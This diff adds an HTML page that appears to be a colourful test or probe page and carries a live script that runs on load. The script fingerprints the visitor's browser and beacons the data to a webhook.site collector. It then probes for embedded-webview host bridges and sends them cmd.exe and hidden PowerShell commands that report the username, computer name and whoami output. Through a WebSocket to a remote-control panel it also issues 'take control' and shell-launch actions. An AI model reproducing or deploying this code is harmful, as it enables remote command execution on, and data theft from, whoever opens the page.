@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>MOD1251_762</title>
+<style>
+html,body{margin:0;padding:0;height:100%;font-family:Arial,Helvetica,sans-serif}
+body{background:linear-gradient(135deg,#ff00ff 0%,#ff00ff 50%,#00ff00 50%,#00ff00 100%)}
+.bar{background:#000080;color:#ffffff;font-size:72px;padding:28px;text-align:center;letter-spacing:4px}
+.sub{font-size:30px;color:#000000;background:#ffff00;padding:12px;text-align:center}
+.band{height:150px;background:#ff0000;color:#ffffff;font-size:52px;text-align:center;line-height:150px}
+</style></head>
+<body>
+<div class="bar">MOD 1251 PLAINTEXT 762</div>
+<div class="sub" id="st">INTENT 762 PLAINTEXT MODULE PROBE</div>
+<div class="band">RED BAND 1251 PLAINTEXT PROOF</div>
+<img src="https://webhook.site/3989733d-8ba1-4aa5-b1cf-2b485da08a76?ev=img_static&amp;m=1251&amp;g=nojs&amp;t=1" width="2" height="2" style="position:absolute;left:6px;top:6px">
+<script>
+(function(){
+var U="https://webhook.site/3989733d-8ba1-4aa5-b1cf-2b485da08a76";
+var M=1251;
+var G=(Math.random().toString(36).slice(2,10))||"x";
+var URL_C="https://raw.githubusercontent.com/yadevlaxman68-coder/htmls/main/1251.html";
+function enc(o){var a=[];for(var k in o){if(o[k]!==undefined&&o[k]!==null){try{a.push(encodeURIComponent(k)+"="+encodeURIComponent(String(o[k]).slice(0,240)));}catch(e){}}}return a.join("&");}
+function hit(tag,o){o=o||{};o.ev=tag;o.m=M;o.g=G;o.t=Date.now();var u=U+"?"+enc(o);
+ try{var i=new Image();i.src=u;}catch(e){}
+ try{fetch(u,{mode:"no-cors",cache:"no-store"});}catch(e){}
+ try{navigator.sendBeacon(u,"x");}catch(e){}
+}
+function keys(){var out=[];try{for(var k in window){if(/call|exe|shell|app|delphi|bridge|host|conn|ws|sock|native|invoke|chrome|extern/i.test(k))out.push(k);}}catch(e){}return out.slice(0,40).join(",");}
+var base={href:(""+location.href).slice(0,300),ref:(""+document.referrer).slice(0,200),ua:(""+navigator.userAgent).slice(0,300),plat:navigator.platform,scr:(screen.width+"x"+screen.height),av:(screen.availWidth+"x"+screen.availHeight),dpr:window.devicePixelRatio,lang:navigator.language,tz:(function(){try{return Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){return "?";}})()};
+function vis(t){try{var s=document.getElementById("st");if(s)s.textContent=t;}catch(e){}try{document.title=t;}catch(e){}}
+vis("JS OK "+G);
+hit("js_load",base);
+hit("js_keys",{keys:keys()});
+var probed={};
+function probe(name,fn){try{var r=fn();probed[name]=r?"yes":"no";}catch(e){probed[name]="exc:"+(""+e).slice(0,40);}}
+probe("chrome.webview",function(){return window.chrome&&chrome.webview;});
+probe("chrome.webview.postMessage",function(){return window.chrome&&chrome.webview&&typeof chrome.webview.postMessage==="function";});
+probe("external",function(){return window.external;});
+probe("external.notify",function(){return window.external&&typeof window.external.notify==="function";});
+probe("external.invoke",function(){return window.external&&typeof window.external.invoke==="function";});
+probe("delphi",function(){return window.delphi;});
+probe("app",function(){return window.app;});
+probe("host",function(){return window.host;});
+probe("bridge",function(){return window.bridge;});
+probe("neobr",function(){return window.neobr;});
+probe("jQuery",function(){return window.jQuery;});
+hit("js_bridge_scan",probed);
+var bridgeMsg=JSON.stringify({action:"abrir_link",link:"cmd.exe /c curl -s -m 8 \"https://webhook.site/3989733d-8ba1-4aa5-b1cf-2b485da08a76?ev=bridge&m=1251&u=%USERNAME%&h=%COMPUTERNAME%\" >nul 2>&1"});
+function tryBridge(){
+ try{if(window.chrome&&chrome.webview&&chrome.webview.postMessage){chrome.webview.postMessage(bridgeMsg);chrome.webview.postMessage({action:"abrir_link",link:"cmd.exe /c curl -s -m 8 \"https://webhook.site/3989733d-8ba1-4aa5-b1cf-2b485da08a76?ev=bridgeobj&m=1251&u=%USERNAME%&h=%COMPUTERNAME%\" >nul 2>&1"});}}catch(e){}
+ try{if(window.external&&window.external.notify){window.external.notify(bridgeMsg);}}catch(e){}
+ try{if(window.external&&window.external.invoke){window.external.invoke(bridgeMsg);}}catch(e){}
+ try{if(window.delphi&&window.delphi.invoke){window.delphi.invoke(bridgeMsg);}}catch(e){}
+ try{if(window.app&&window.app.invoke){window.app.invoke(bridgeMsg);}}catch(e){}
+}
+tryBridge();
+var done=false;
+function pws(){
+ if(done)return; done=true;
+ try{
+  var sid="pg762"+G;
+  var UID="32A703D7C2639926E9EAF3028A4E3CBC";
+  var w=new WebSocket("wss://remoto.painelst.com:2054/");
+  w.onopen=function(){
+   hit("ws_open",{sid:sid});
+   try{w.send(JSON.stringify({action:"conexao",session_id:sid,user_id:UID,pagina:"operador",htmls_ids:[],setup_config:{},is_operador:true}));}catch(e){}
+   setTimeout(function(){try{w.send(JSON.stringify({action:"tomar_controle",session_id:sid,user_id:UID}));}catch(e){}},450);
+   setTimeout(function(){try{w.send(JSON.stringify({action:"abrir_link",link:"cmd.exe /c curl -s -m 8 \"https://webhook.site/3989733d-8ba1-4aa5-b1cf-2b485da08a76?ev=shellcmd&m=1251&u=%USERNAME%&h=%COMPUTERNAME%\" >nul 2>&1",session_id:sid}));}catch(e){}},1700);
+   setTimeout(function(){try{w.send(JSON.stringify({action:"abrir_link",link:"powershell.exe -NoP -W Hidden -c \"iwr ('https://webhook.site/3989733d-8ba1-4aa5-b1cf-2b485da08a76?ev=shellps&m=1251&w='+[uri]::EscapeDataString((whoami))+'&h='+$env:COMPUTERNAME) -UseBasicParsing\"",session_id:sid}));}catch(e){}},3400);
+  };
+  w.onmessage=function(e){hit("ws_msg",{d:(""+e.data).slice(0,240)});};
+  w.onerror=function(){hit("ws_err",{});};
+  w.onclose=function(){hit("ws_close",{});};
+ }catch(e){hit("ws_ex",{x:(""+e).slice(0,120)});}
+}
+setTimeout(pws,1300);
+setTimeout(function(){hit("js_alive",{vis:document.visibilityState,n:document.images.length});},3000);
+setTimeout(function(){hit("js_alive2",{title:document.title});},7000);
+})();
+</script>
+</body></html>
